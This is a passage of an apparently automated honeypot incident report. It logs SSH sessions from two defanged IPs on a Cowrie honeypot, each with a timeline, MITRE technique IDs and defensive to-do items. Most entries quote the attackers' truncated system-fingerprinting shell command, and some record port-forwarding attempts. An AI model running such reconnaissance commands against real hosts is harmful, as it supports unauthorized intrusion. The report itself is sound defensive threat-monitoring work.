| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:46:54` | `cowrie.session.connect` |
| `2026-09-03 14:46:55` | `cowrie.client.version` |
| `2026-09-03 14:46:55` | `cowrie.client.kex` |
| `2026-09-03 14:46:57` | `cowrie.login.success` |
| `2026-09-03 14:46:59` | `cowrie.session.params` |
| `2026-09-03 14:46:59` | `cowrie.command.input` |
| `2026-09-03 14:46:59` | `cowrie.command.input` |
| `2026-09-03 14:46:59` | `cowrie.command.input` |
| `2026-09-03 14:46:59` | `cowrie.command.input` |
| `2026-09-03 14:46:59` | `cowrie.command.input` |
| `2026-09-03 14:46:59` | `cowrie.command.success` |
| `2026-09-03 14:46:59` | `cowrie.command.input` |
| `2026-09-03 14:46:59` | `cowrie.command.input` |
| `2026-09-03 14:46:59` | `cowrie.command.input` |
| `2026-09-03 14:46:59` | `cowrie.command.input` |
| `2026-09-03 14:47:00` | `cowrie.log.closed` |
| `2026-09-03 14:47:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a124c7e1f97

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 14:49 |
| **Last Seen** | 2026-09-03 14:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:49:08` | `cowrie.session.connect` |
| `2026-09-03 14:49:09` | `cowrie.client.version` |
| `2026-09-03 14:49:09` | `cowrie.client.kex` |
| `2026-09-03 14:49:11` | `cowrie.login.success` |
| `2026-09-03 14:49:13` | `cowrie.session.params` |
| `2026-09-03 14:49:13` | `cowrie.command.input` |
| `2026-09-03 14:49:13` | `cowrie.command.input` |
| `2026-09-03 14:49:13` | `cowrie.command.input` |
| `2026-09-03 14:49:13` | `cowrie.command.input` |
| `2026-09-03 14:49:13` | `cowrie.command.input` |
| `2026-09-03 14:49:13` | `cowrie.command.success` |
| `2026-09-03 14:49:13` | `cowrie.command.input` |
| `2026-09-03 14:49:13` | `cowrie.command.input` |
| `2026-09-03 14:49:13` | `cowrie.command.input` |
| `2026-09-03 14:49:13` | `cowrie.command.input` |
| `2026-09-03 14:49:14` | `cowrie.log.closed` |
| `2026-09-03 14:49:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53d32aeec2e0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 14:51 |
| **Last Seen** | 2026-09-03 14:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:51:24` | `cowrie.session.connect` |
| `2026-09-03 14:51:25` | `cowrie.client.version` |
| `2026-09-03 14:51:25` | `cowrie.client.kex` |
| `2026-09-03 14:51:27` | `cowrie.login.success` |
| `2026-09-03 14:51:28` | `cowrie.session.params` |
| `2026-09-03 14:51:28` | `cowrie.command.input` |
| `2026-09-03 14:51:28` | `cowrie.command.input` |
| `2026-09-03 14:51:28` | `cowrie.command.input` |
| `2026-09-03 14:51:28` | `cowrie.command.input` |
| `2026-09-03 14:51:28` | `cowrie.command.input` |
| `2026-09-03 14:51:28` | `cowrie.command.success` |
| `2026-09-03 14:51:28` | `cowrie.command.input` |
| `2026-09-03 14:51:28` | `cowrie.command.input` |
| `2026-09-03 14:51:28` | `cowrie.command.input` |
| `2026-09-03 14:51:28` | `cowrie.command.input` |
| `2026-09-03 14:51:29` | `cowrie.log.closed` |
| `2026-09-03 14:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22b6a2d70e40

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 14:53 |
| **Last Seen** | 2026-09-03 14:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:53:42` | `cowrie.session.connect` |
| `2026-09-03 14:53:42` | `cowrie.client.version` |
| `2026-09-03 14:53:42` | `cowrie.client.kex` |
| `2026-09-03 14:53:44` | `cowrie.login.success` |
| `2026-09-03 14:53:46` | `cowrie.session.params` |
| `2026-09-03 14:53:46` | `cowrie.command.input` |
| `2026-09-03 14:53:46` | `cowrie.command.input` |
| `2026-09-03 14:53:46` | `cowrie.command.input` |
| `2026-09-03 14:53:46` | `cowrie.command.input` |
| `2026-09-03 14:53:46` | `cowrie.command.input` |
| `2026-09-03 14:53:46` | `cowrie.command.success` |
| `2026-09-03 14:53:46` | `cowrie.command.input` |
| `2026-09-03 14:53:46` | `cowrie.command.input` |
| `2026-09-03 14:53:46` | `cowrie.command.input` |
| `2026-09-03 14:53:46` | `cowrie.command.input` |
| `2026-09-03 14:53:46` | `cowrie.log.closed` |
| `2026-09-03 14:53:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0baa3fd5321

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 14:55 |
| **Last Seen** | 2026-09-03 14:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:55:09` | `cowrie.session.connect` |
| `2026-09-03 14:55:09` | `cowrie.client.version` |
| `2026-09-03 14:55:09` | `cowrie.client.kex` |
| `2026-09-03 14:55:10` | `cowrie.login.success` |
| `2026-09-03 14:55:11` | `cowrie.direct-tcpip.request` |
| `2026-09-03 14:55:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 14:55:11` | `cowrie.direct-tcpip.data` |
| `2026-09-03 14:55:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a301c8706ddb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 14:56 |
| **Last Seen** | 2026-09-03 14:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:56:01` | `cowrie.session.connect` |
| `2026-09-03 14:56:01` | `cowrie.client.version` |
| `2026-09-03 14:56:01` | `cowrie.client.kex` |
| `2026-09-03 14:56:03` | `cowrie.login.success` |
| `2026-09-03 14:56:03` | `cowrie.session.params` |
| `2026-09-03 14:56:03` | `cowrie.command.input` |
| `2026-09-03 14:56:03` | `cowrie.command.input` |
| `2026-09-03 14:56:03` | `cowrie.command.input` |
| `2026-09-03 14:56:03` | `cowrie.command.input` |
| `2026-09-03 14:56:04` | `cowrie.command.input` |
| `2026-09-03 14:56:04` | `cowrie.command.success` |
| `2026-09-03 14:56:04` | `cowrie.command.input` |
| `2026-09-03 14:56:04` | `cowrie.command.input` |
| `2026-09-03 14:56:04` | `cowrie.command.input` |
| `2026-09-03 14:56:04` | `cowrie.command.input` |
| `2026-09-03 14:56:04` | `cowrie.log.closed` |
| `2026-09-03 14:56:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f25f727f08fa

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 14:57 |
| **Last Seen** | 2026-09-03 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:57:11` | `cowrie.session.connect` |
| `2026-09-03 14:57:11` | `cowrie.client.version` |
| `2026-09-03 14:57:12` | `cowrie.client.kex` |
| `2026-09-03 14:57:12` | `cowrie.login.success` |
| `2026-09-03 14:57:13` | `cowrie.direct-tcpip.request` |
| `2026-09-03 14:57:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 14:57:13` | `cowrie.direct-tcpip.data` |
| `2026-09-03 14:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e006f4109f80

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 14:58 |
| **Last Seen** | 2026-09-03 14:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:58:18` | `cowrie.session.connect` |
| `2026-09-03 14:58:18` | `cowrie.client.version` |
| `2026-09-03 14:58:18` | `cowrie.client.kex` |
| `2026-09-03 14:58:20` | `cowrie.login.success` |
| `2026-09-03 14:58:21` | `cowrie.session.params` |
| `2026-09-03 14:58:21` | `cowrie.command.input` |
| `2026-09-03 14:58:21` | `cowrie.command.input` |
| `2026-09-03 14:58:21` | `cowrie.command.input` |
| `2026-09-03 14:58:21` | `cowrie.command.input` |
| `2026-09-03 14:58:21` | `cowrie.command.input` |
| `2026-09-03 14:58:21` | `cowrie.command.success` |
| `2026-09-03 14:58:21` | `cowrie.command.input` |
| `2026-09-03 14:58:21` | `cowrie.command.input` |
| `2026-09-03 14:58:21` | `cowrie.command.input` |
| `2026-09-03 14:58:21` | `cowrie.command.input` |
| `2026-09-03 14:58:22` | `cowrie.log.closed` |
| `2026-09-03 14:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24e2a8ae42f6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:00 |
| **Last Seen** | 2026-09-03 15:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:00:34` | `cowrie.session.connect` |
| `2026-09-03 15:00:34` | `cowrie.client.version` |
| `2026-09-03 15:00:35` | `cowrie.client.kex` |
| `2026-09-03 15:00:36` | `cowrie.login.success` |
| `2026-09-03 15:00:37` | `cowrie.session.params` |
| `2026-09-03 15:00:37` | `cowrie.command.input` |
| `2026-09-03 15:00:37` | `cowrie.command.input` |
| `2026-09-03 15:00:37` | `cowrie.command.input` |
| `2026-09-03 15:00:37` | `cowrie.command.input` |
| `2026-09-03 15:00:37` | `cowrie.command.input` |
| `2026-09-03 15:00:37` | `cowrie.command.success` |
| `2026-09-03 15:00:37` | `cowrie.command.input` |
| `2026-09-03 15:00:37` | `cowrie.command.input` |
| `2026-09-03 15:00:37` | `cowrie.command.input` |
| `2026-09-03 15:00:37` | `cowrie.command.input` |
| `2026-09-03 15:00:38` | `cowrie.log.closed` |
| `2026-09-03 15:00:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7644b146888

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:02 |
| **Last Seen** | 2026-09-03 15:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:02:52` | `cowrie.session.connect` |
| `2026-09-03 15:02:52` | `cowrie.client.version` |
| `2026-09-03 15:02:52` | `cowrie.client.kex` |
| `2026-09-03 15:02:54` | `cowrie.login.success` |
| `2026-09-03 15:02:55` | `cowrie.session.params` |
| `2026-09-03 15:02:55` | `cowrie.command.input` |
| `2026-09-03 15:02:55` | `cowrie.command.input` |
| `2026-09-03 15:02:55` | `cowrie.command.input` |
| `2026-09-03 15:02:55` | `cowrie.command.input` |
| `2026-09-03 15:02:55` | `cowrie.command.input` |
| `2026-09-03 15:02:55` | `cowrie.command.success` |
| `2026-09-03 15:02:55` | `cowrie.command.input` |
| `2026-09-03 15:02:55` | `cowrie.command.input` |
| `2026-09-03 15:02:55` | `cowrie.command.input` |
| `2026-09-03 15:02:55` | `cowrie.command.input` |
| `2026-09-03 15:02:55` | `cowrie.log.closed` |
| `2026-09-03 15:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78a3531ea393

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 15:04 |
| **Last Seen** | 2026-09-03 15:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:04:58` | `cowrie.session.connect` |
| `2026-09-03 15:04:58` | `cowrie.client.version` |
| `2026-09-03 15:04:58` | `cowrie.client.kex` |
| `2026-09-03 15:05:01` | `cowrie.login.success` |
| `2026-09-03 15:05:02` | `cowrie.direct-tcpip.request` |
| `2026-09-03 15:05:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 15:05:02` | `cowrie.direct-tcpip.data` |
| `2026-09-03 15:05:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3382b2956845

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:05 |
| **Last Seen** | 2026-09-03 15:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:05:07` | `cowrie.session.connect` |
| `2026-09-03 15:05:07` | `cowrie.client.version` |
| `2026-09-03 15:05:07` | `cowrie.client.kex` |
| `2026-09-03 15:05:08` | `cowrie.login.success` |
| `2026-09-03 15:05:09` | `cowrie.session.params` |
| `2026-09-03 15:05:09` | `cowrie.command.input` |
| `2026-09-03 15:05:09` | `cowrie.command.input` |
| `2026-09-03 15:05:09` | `cowrie.command.input` |
| `2026-09-03 15:05:09` | `cowrie.command.input` |
| `2026-09-03 15:05:09` | `cowrie.command.input` |
| `2026-09-03 15:05:09` | `cowrie.command.success` |
| `2026-09-03 15:05:09` | `cowrie.command.input` |
| `2026-09-03 15:05:09` | `cowrie.command.input` |
| `2026-09-03 15:05:09` | `cowrie.command.input` |
| `2026-09-03 15:05:09` | `cowrie.command.input` |
| `2026-09-03 15:05:10` | `cowrie.log.closed` |
| `2026-09-03 15:05:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d83d3c47bbe4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:07 |
| **Last Seen** | 2026-09-03 15:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:07:20` | `cowrie.session.connect` |
| `2026-09-03 15:07:21` | `cowrie.client.version` |
| `2026-09-03 15:07:21` | `cowrie.client.kex` |
| `2026-09-03 15:07:22` | `cowrie.login.success` |
| `2026-09-03 15:07:22` | `cowrie.session.params` |
| `2026-09-03 15:07:22` | `cowrie.command.input` |
| `2026-09-03 15:07:22` | `cowrie.command.input` |
| `2026-09-03 15:07:22` | `cowrie.command.input` |
| `2026-09-03 15:07:22` | `cowrie.command.input` |
| `2026-09-03 15:07:22` | `cowrie.command.input` |
| `2026-09-03 15:07:22` | `cowrie.command.success` |
| `2026-09-03 15:07:22` | `cowrie.command.input` |
| `2026-09-03 15:07:22` | `cowrie.command.input` |
| `2026-09-03 15:07:22` | `cowrie.command.input` |
| `2026-09-03 15:07:22` | `cowrie.command.input` |
| `2026-09-03 15:07:23` | `cowrie.log.closed` |
| `2026-09-03 15:07:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d08d2a00988

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 15:08 |
| **Last Seen** | 2026-09-03 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 15:08:24` | `cowrie.session.connect` |
| `2026-09-03 15:08:24` | `cowrie.client.version` |
| `2026-09-03 15:08:24` | `cowrie.client.kex` |
| `2026-09-03 15:08:25` | `cowrie.login.success` |
| `2026-09-03 15:08:25` | `cowrie.direct-tcpip.request` |
| `2026-09-03 15:08:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 15:08:25` | `cowrie.direct-tcpip.data` |
| `2026-09-03 15:08:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23f04ef53c3e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-03 15:09 |
| **Last Seen** | 2026-09-03 15:09 |
| **Session Duration** | 3s |
